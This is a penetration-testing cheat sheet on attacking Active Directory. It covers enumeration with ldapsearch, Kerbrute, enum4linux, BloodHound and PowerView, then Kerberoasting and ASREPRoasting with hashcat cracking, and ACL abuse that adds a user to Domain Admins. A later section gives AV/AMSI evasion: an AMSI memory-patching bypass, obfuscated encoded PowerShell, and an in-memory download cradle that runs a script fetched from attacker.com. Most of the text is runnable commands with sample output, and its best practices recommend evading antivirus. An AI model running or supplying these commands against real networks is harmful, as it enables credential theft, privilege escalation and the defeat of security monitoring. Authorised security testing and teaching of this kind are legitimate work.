# Enumeration in Active Directory Penetration Testing

## Overview
Enumeration involves actively querying the AD environment to gather detailed information about users, groups, computers, and configurations. This phase maps the AD structure and identifies vulnerabilities or misconfigurations for exploitation.

## Detailed Methods and Techniques
- **User Enumeration**:
  - **Technique**: Query AD for user accounts, including usernames, SIDs, and attributes (e.g., disabled, locked-out, password policies).
    - **Execution**: Use `ldapsearch` with valid credentials or anonymously if permitted.
      ```bash
      ldapsearch -x -H ldap://192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectClass=user)" sAMAccountName userAccountControl
      ```
      **Example Output**:
      ```
      dn: CN=John Doe,CN=Users,DC=example,DC=com
      sAMAccountName: jdoe
      userAccountControl: 512 (Enabled)
      dn: CN=Jane Smith,CN=Users,DC=example,DC=com
      sAMAccountName: jsmith
      userAccountControl: 514 (Disabled)
      ```
    - **Purpose**: Identify valid accounts for brute-forcing or targeting high-privilege users.
  - **Technique**: Enumerate usernames via Kerberos pre-authentication responses.
    - **Execution**: Use `Kerbrute` to validate usernames.
      ```bash
      kerbrute userenum -d example.com --dc 192.168.1.10 users.txt
      ```
      **Example Output**:
      ```
      [+] VALID USERNAME: jdoe@EXAMPLE.COM
      [+] VALID USERNAME: jsmith@EXAMPLE.COM
      ```
    - **Purpose**: Confirm active AD accounts without triggering lockouts.
  - **Technique**: Enumerate users via SMB null sessions (if enabled).
    - **Execution**: Use `enum4linux`.
      ```bash
      enum4linux -U 192.168.1.10
      ```
      **Example Output**:
      ```
      user:[jdoe] rid:[1001]
      user:[jsmith] rid:[1002]
      user:[Administrator] rid:[500]
      ```
    - **Purpose**: Discover user accounts without authentication.
- **Group Enumeration**:
  - **Technique**: List group memberships to identify high-privilege groups (e.g., Domain Admins, Enterprise Admins).
    - **Execution**: Use `net` command or PowerView.
      ```bash
      net group "Domain Admins" /domain
      ```
      **Example Output**:
      ```
      Group name     Domain Admins
      Members        Administrator, jdoe
      ```
      - **PowerView Execution**:
        ```powershell
        Import-Module PowerView.ps1
        Get-NetGroupMember -GroupName "Domain Admins"
        ```
        **Example Output**:
        ```
        MemberName      : jdoe
        SID             : S-1-5-21-1234567890-0987654321-1001
        IsAdmin         : True
        ```
    - **Purpose**: Identify accounts with elevated privileges.
  - **Technique**: Enumerate Access Control Lists (ACLs) for group permissions.
    - **Execution**: Use `ADACLScanner`.
      ```bash
      ADACLScanner -dc-ip 192.168.1.10 -user user -pass password -target "CN=Domain Admins,CN=Users,DC=example,DC=com"
      ```
      **Example Output**:
      ```
      ACE: jdoe has FullControl on Domain Admins
      ```
    - **Purpose**: Identify misconfigured permissions for escalation.
- **Computer Enumeration**:
  - **Technique**: Identify domain controllers, servers, and workstations.
    - **Execution**: Use `BloodHound` to map AD objects.
      ```bash
      bloodhound-python -u user -p password -d example.com -c All --dc 192.168.1.10
      ```
      **Example Output**: Generates JSON files for BloodHound GUI, showing computers like `dc01.example.com`.
    - **Purpose**: Map the AD network for lateral movement planning.
  - **Technique**: Enumerate Service Principal Names (SPNs) for service accounts.
    - **Execution**: Use `PowerView`.
      ```powershell
      Get-NetUser -SPN
      ```
      **Example Output**:
      ```
      sAMAccountName: sqlservice
      servicePrincipalName: MSSQLSvc/sql01.example.com:1433
      ```
    - **Purpose**: Identify service accounts for Kerberoasting.

## Exploitation Methods
- **Kerberoasting**:
  - **Technique**: Request TGS tickets for service accounts with SPNs and crack them offline.
  - **Execution**: Use `GetUserSPNs.py` from Impacket.
    ```bash
    GetUserSPNs.py -dc-ip 192.168.1.10 example.com/user:password -request
    ```
    **Example Output**:
    ```
    ServicePrincipalName: MSSQLSvc/sql01.example.com:1433
    Ticket: [TGS ticket data]
    ```
    - Crack with `hashcat`:
      ```bash
      hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt
      ```
      **Example Output**:
      ```
      MSSQLSvc/sql01.example.com:1433:ServiceP@ss123
      ```
    - **Purpose**: Obtain service account credentials for escalation.
- **ASREPRoast**:
  - **Technique**: Target accounts with Kerberos pre-authentication disabled.
  - **Execution**: Use `GetNPUsers.py` from Impacket.
    ```bash
    GetNPUsers.py example.com/ -usersfile users.txt -dc-ip 192.168.1.10
    ```
    **Example Output**:
    ```
    jdoe:$krb5asrep$23$jdoe@EXAMPLE.COM:[hash]
    ```
    - Crack with `hashcat`:
      ```bash
      hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
      ```
      **Example Output**:
      ```
      jdoe:P@ssw0rd123
      ```
    - **Purpose**: Harvest credentials for accounts with weak passwords.
- **ACL Abuse**:
  - **Technique**: Exploit misconfigured DACLs to gain unauthorized permissions (e.g., GenericAll on a group).
  - **Execution**: Use `PowerView` to modify group memberships.
    ```powershell
    Add-DomainGroupMember -Identity "Domain Admins" -Members jdoe
    ```
    **Example Output**:
    ```
    jdoe added to Domain Admins
    ```
    - **Purpose**: Escalate privileges via misconfigured ACLs.

## AV/AMSI Evasion Techniques
- **Obfuscated PowerShell Scripts**:
  - **Technique**: Obfuscate PowerView scripts to bypass AMSI detection.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {Get-NetUser -SPN} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI scanning during enumeration.
- **In-Memory Execution**:
  - **Technique**: Run enumeration scripts in memory to avoid disk-based AV detection.
  - **Execution**: Use `Invoke-Expression` with a remote script.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powerview.ps1')
    ```
    - **Purpose**: Avoid AV detection by not saving scripts to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**: Use a bypass script.
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell scripts from being scanned by AMSI.
- **Encrypted LDAP Queries**:
  - **Technique**: Use LDAPS (port 636) instead of LDAP (port 389) to encrypt enumeration traffic.
  - **Execution**: Modify `ldapsearch` to use LDAPS.
    ```bash
    ldapsearch -H ldaps://192.168.1.10 -D "user@example.com" -w "password" -b "DC=example,DC=com" "(objectClass=user)"
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.

## Tools
- **ldapsearch**: LDAP queries (`ldapsearch -x -H ldap://<dc>`).
- **Kerbrute**: Username enumeration (`kerbrute userenum`).
- **enum4linux**: SMB enumeration (`enum4linux -a <target>`).
- **BloodHound**: AD relationship mapping.
- **PowerView**: PowerShell-based enumeration (`Get-NetUser`, `Get-NetGroup`).
- **Impacket**: Kerberoasting and ASREPRoast (`GetUserSPNs.py`, `GetNPUsers.py`).
- **ADACLScanner**: ACL enumeration.

## Best Practices
- Use valid credentials or anonymous access to minimize detection.
- Document all enumerated objects for attack planning.
- Verify permission for active enumeration to avoid legal issues.
- Use obfuscation and in-memory execution to evade AV/AMSI.